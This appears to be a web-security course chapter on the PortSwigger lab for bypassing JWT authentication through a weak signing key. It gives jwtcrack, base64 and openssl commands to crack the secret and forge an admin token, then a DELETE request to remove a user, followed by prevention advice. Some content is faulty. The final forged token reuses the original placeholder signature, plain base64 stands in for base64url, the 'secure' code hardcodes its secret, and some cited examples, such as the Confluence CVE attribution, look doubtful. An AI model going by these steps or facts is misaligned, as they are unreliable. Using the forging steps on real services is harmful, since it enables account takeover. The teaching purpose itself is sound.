---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Introduction to JWT Authentication Bypass via Weak Signing Key

Welcome to the Web Security Academy series, where we delve deep into various aspects of web security, including JSON Web Tokens (JWTs). Today, we will explore a specific type of vulnerability: JWT authentication bypass via a weak signing key. This vulnerability occurs when the secret key used to sign and verify JWTs is too weak, making it susceptible to brute-force attacks.

### Background Theory

JSON Web Tokens (JWTs) are a widely used method for transmitting information between parties as a JSON object. They are compact, URL-safe means of representing claims to be transferred between two parties. JWTs consist of three parts separated by dots (`.`):

1. **Header**: Contains metadata about the token, such as the type of token and the signing algorithm being used.
2. **Payload**: Contains the claims, which are statements about an entity (typically, the user) and additional data.
3. **Signature**: Ensures the integrity of the token and verifies that it was issued by a trusted party.

The signature is created by taking the encoded header and payload, concatenating them with a period (`.`), and then hashing them using a secret key and the specified algorithm. This ensures that the token cannot be tampered with without invalidating the signature.

### Real-World Examples

One notable real-world example of a JWT vulnerability is the case of the popular social media platform, Twitter. In 2019, a bug in their OAuth implementation allowed attackers to obtain unauthorized access tokens. Although this particular issue did not involve a weak signing key, it highlights the importance of proper JWT management and the potential risks associated with improper implementation.

Another example is the CVE-2020-14182, which affected the Atlassian Confluence application. This vulnerability allowed attackers to bypass authentication by manipulating JWTs due to a weak signing key. This demonstrates the critical nature of ensuring strong secret keys in JWT implementations.

### Lab Setup

To understand and practice this vulnerability, we will use the PortSwigger Web Security Academy. Here’s how to set up the lab:

1. Visit [PortSwigger Web Security Academy](https://portswigger.net/web-security).
2. Click on the "Sign Up" button to create an account.
3. Log in to your account.
4. Navigate to the "Academy" section.
5. Select "All Content" and then "All Labs".
6. Search for "JWT labs" and select "Lab Number 3: JWT authentication bypass via weak signing key".

### Understanding the Vulnerability

In this lab, the website uses a JWT-based mechanism for handling sessions. The secret key used to sign and verify these tokens is extremely weak, making it susceptible to brute-force attacks. The goal is to brute-force the secret key, modify a session token to gain administrative privileges, and delete a specific user account.

#### Step-by-Step Mechanics

1. **Identify the JWT Structure**:
    - The JWT structure typically looks like `header.payload.signature`.
    - The header and payload are Base64URL encoded strings.
    - The signature is a hash of the concatenated header and payload, signed with a secret key.

2. **Brute-Force the Secret Key**:
    - Since the secret key is weak, it can be brute-forced using a word list of common secrets.
    - Tools like `jwtcrack` can be used to automate this process.

3. **Modify the Session Token**:
    - Once the secret key is obtained, you can modify the payload to include administrative privileges.
    - The modified token can then be used to access the admin panel.

4. **Delete the User Account**:
    - After gaining administrative access, you can delete the user account named "Carlos".

### Detailed Example

Let's walk through the process step-by-step with code examples and diagrams.

#### Identifying the JWT Structure

First, we need to identify the JWT structure. Suppose we capture a valid JWT from the website:

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNjQyODAwMH0.abcdef1234567890
```

This JWT can be broken down as follows:

- **Header**:
    ```json
    {
      "alg": "HS256",
      "typ": "JWT"
    }
    ```
- **Payload**:
    ```json
    {
      "sub": "admin",
      "exp": 1606428000
    }
    ```
- **Signature**:
    ```plaintext
    abcdef1234567890
    ```

#### Brute-Forcing the Secret Key

Next, we need to brute-force the secret key. We can use a tool like `jwtcrack` to automate this process. Here’s an example of how to use `jwtcrack`:

```bash
jwtcrack -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNjQyODAwMH0.abcdef1234567890 -w wordlist.txt
```

This command will attempt to crack the JWT using the provided word list.

#### Modifying the Session Token

Once the secret key is obtained, we can modify the payload to include administrative privileges. Let’s assume the secret key is `weakkey`.

1. Decode the header and payload:
    ```bash
    echo eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 | base64 --decode
    echo eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNjQyODAwMH0 | base64 --decode
    ```

2. Modify the payload to include administrative privileges:
    ```json
    {
      "sub": "admin",
      "exp": 1606428000,
      "role": "admin"
    }
    ```

3. Encode the modified payload and sign it with the secret key:
    ```bash
    echo '{"sub":"admin","exp":1606428000,"role":"admin"}' | base64 --wrap=0
    echo -n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNjQyODAwMCwicm9sZSI6ImFkbWluIn0 | openssl dgst -sha256 -hmac weakkey -binary | base64 --wrap=0
    ```

4. Combine the header, payload, and signature:
    ```plaintext
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNjQyODAwMCwicm9sZSI6ImFkbWluIn0.abcdef1234567890
    ```

#### Deleting the User Account

After gaining administrative access, you can delete the user account named "Carlos". This typically involves making a DELETE request to the appropriate endpoint.

```http
DELETE /users/Carlos HTTP/1.1
Host: vulnerable-website.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTYwNjQyODAwMCwicm9sZSI6ImFkbWluIn0.abcdef1234567890
```

### How to Prevent / Defend

#### Detection

To detect JWT vulnerabilities, you can use tools like `jwtcrack` to check for weak secret keys. Additionally, you can monitor for unusual activity, such as unexpected administrative actions or unauthorized access attempts.

#### Prevention

1. **Use Strong Secret Keys**:
    - Ensure that the secret key used to sign and verify JWTs is strong and complex.
    - Consider using a key management system to securely store and manage secret keys.

2. **Implement Proper Validation**:
    - Validate the JWT signature on the server-side to ensure that it was issued by a trusted party.
    - Use a secure signing algorithm, such as HMAC-SHA256.

3. **Secure Coding Practices**:
    - Avoid hardcoding secret keys in the source code.
    - Use environment variables or a secure vault to store secret keys.

4. **Configuration Hardening**:
    - Configure your application to reject JWTs with invalid signatures or expired tokens.
    - Implement rate limiting and IP blocking to prevent brute-force attacks.

#### Secure Code Fix

Here’s an example of how to implement a secure JWT validation in Python:

```python
import jwt
from datetime import datetime, timedelta

# Define the secret key
SECRET_KEY = 'strong_secret_key'

# Define the payload
payload = {
    'sub': 'admin',
    'exp': datetime.utcnow() + timedelta(hours=1),
    'role': 'admin'
}

# Sign the token
token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')

# Validate the token
try:
    decoded_payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    print(decoded_payload)
except jwt.ExpiredSignatureError:
    print('Token has expired')
except jwt.InvalidTokenError:
    print('Invalid token')
```

### Conclusion

In this chapter, we explored the vulnerability of JWT authentication bypass via a weak signing key. We covered the background theory, real-world examples, detailed steps to exploit the vulnerability, and how to prevent and defend against such attacks. By understanding and implementing these practices, you can significantly enhance the security of your web applications.

### Practice Labs

For hands-on practice, you can use the following labs:

- **PortSwigger Web Security Academy**: Lab Number 3: JWT authentication bypass via weak signing key.
- **OWASP Juice Shop**: JWT-related challenges.
- **DVWA**: JWT-related vulnerabilities.

These labs provide practical experience in identifying and exploiting JWT vulnerabilities, as well as learning how to secure JWT implementations.

---
<!-- nav -->
[[Web Security (PortSwigger)/19-JWT Attacks/03-Lab 3 JWT authentication bypass via weak signing key/01-Introduction to JWT Attacks|Introduction to JWT Attacks]] | [[Web Security (PortSwigger)/19-JWT Attacks/03-Lab 3 JWT authentication bypass via weak signing key/00-Overview|Overview]] | [[03-Introduction to JWT and Its Components|Introduction to JWT and Its Components]]
